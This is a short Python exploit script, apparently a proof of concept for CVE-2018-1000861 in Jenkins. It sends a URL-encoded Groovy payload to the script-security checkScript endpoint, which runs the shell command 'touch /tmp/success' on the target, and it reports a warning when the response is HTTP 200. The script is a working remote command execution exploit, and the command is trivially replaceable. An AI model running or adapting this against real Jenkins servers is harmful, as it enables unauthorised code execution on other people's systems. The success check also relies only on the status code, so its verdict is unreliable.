"""
@Author: exiashow
@File: jenkins_rce.py
@Date: 2024/2/29 16:14
@Desc: CVE-2018-1000861, jenkins Remote command executing
@Module: 
"""

import requests
import sys


class JenkinsRce(object):
    def __init__(self, url):
        self.url = url

    def run(self):
        """
        payload为
        public class x {
            public x(){
            "touch /tmp/success".execute()
            }
        的16进制
        :return:
        """
        path = ":8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript"
        payload = "?sandbox=true&value=%70%75%62%6c%69%63%20%63%6c%61%73%73%20%78%20%7b%0a%20%20%70%75%62%6c%69%63%20%78%28%29%7b%0a%20%20%20%20%22%74%6f%75%63%68%20%2f%74%6d%70%2f%73%75%63%63%65%73%73%22%2e%65%78%65%63%75%74%65%28%29%0a%20%20%7d%0a%7d"

        final_url = self.url + path + payload

        try:
            r = requests.get(final_url)
            if r.status_code == 200:
                return "[Warning] Jenkins vulnerability discovered: CVE-2018-1000861"
            else:
                None
        except Exception as e:
            return None


if __name__ == '__main__':
    fallingSword = JenkinsRce(sys.argv[1])
    print(fallingSword.run())
